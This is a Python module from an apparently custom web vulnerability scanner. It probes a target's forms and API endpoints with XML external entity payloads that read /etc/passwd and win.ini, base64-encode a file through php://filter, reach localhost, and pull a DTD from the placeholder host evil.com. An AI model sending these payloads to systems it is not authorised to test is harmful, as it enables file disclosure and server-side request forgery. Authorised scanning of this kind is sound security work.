"""
XXE Scanner — XML External Entity Injection
Author: ARIF
"""

import asyncio
import logging
from typing import List, Optional, Dict
from urllib.parse import urljoin
from core.engine import Vulnerability, Severity
from core.requester import Requester


class XxeScanner:
    def __init__(self, config: Dict):
        self.logger = logging.getLogger(__name__)
        self.config = config
        self.requester = Requester(config)
        self.vulnerabilities = []
        self.results_lock = asyncio.Lock()

    async def scan(self, target: str) -> List[Vulnerability]:
        self.logger.info(f"Starting XXE scan on {target}")
        self.vulnerabilities = []
        try:
            response = await self.requester.get(target)
            if not response:
                return self.vulnerabilities
            html = await response.text()
            forms = await self.requester.extract_forms(target, html)

            tasks = []

            for form in forms:
                if form.get("method", "GET").upper() == "POST":
                    action = form.get("action", "")
                    if action:
                        tasks.append(self._test_xxe(urljoin(target, action)))

            endpoints = ["/api", "/api/", "/api/xml", "/api/v1", "/ws", "/soap", "/xmlrpc.php"]
            for ep in endpoints:
                tasks.append(self._test_xxe(urljoin(target, ep)))

            if tasks:
                await asyncio.gather(*tasks)
        except Exception as e:
            self.logger.error(f"XXE scan error on {target}: {e}")
        return self.vulnerabilities

    async def _test_xxe(self, url: str) -> None:
        payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % test SYSTEM "file:///etc/passwd">%test;]><root/>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://127.0.0.1:80/">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://localhost:8080/">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;]><root/>'
        ]
        content_types = ["application/xml", "text/xml", "application/x-xml", "application/soap+xml"]

        for payload in payloads[:5]:
            for ct in content_types[:2]:
                try:
                    headers = {"Content-Type": ct}
                    response = await self.requester.post(url, data=payload.encode(), headers=headers)
                    if not response:
                        continue
                    test_html = await response.text()

                    indicators = ["root:", "bin:", "daemon:", "nobody:", "[fonts]", "[extensions]",
                                  "uid=", "gid=", "Microsoft Windows"]
                    for indicator in indicators:
                        if indicator in test_html:
                            vuln = Vulnerability(
                                name="XML External Entity (XXE)",
                                description=f"XXE vulnerability at {url} - file disclosure via XML external entity",
                                severity=Severity.CRITICAL,
                                url=url,
                                parameter="XML Body",
                                payload=payload[:100],
                                evidence=f"File contents disclosed: '{indicator}' found in response",
                                remediation="Disable XML external entity processing. Use JSON instead of XML where possible. Upgrade XML parser libraries.",
                                cvss_score=9.1,
                                confidence=0.9,
                                module="xxe"
                            )
                            async with self.results_lock:
                                self.vulnerabilities.append(vuln)
                            return
                except Exception as e:
                    self.logger.debug(f"XXE test error: {e}")
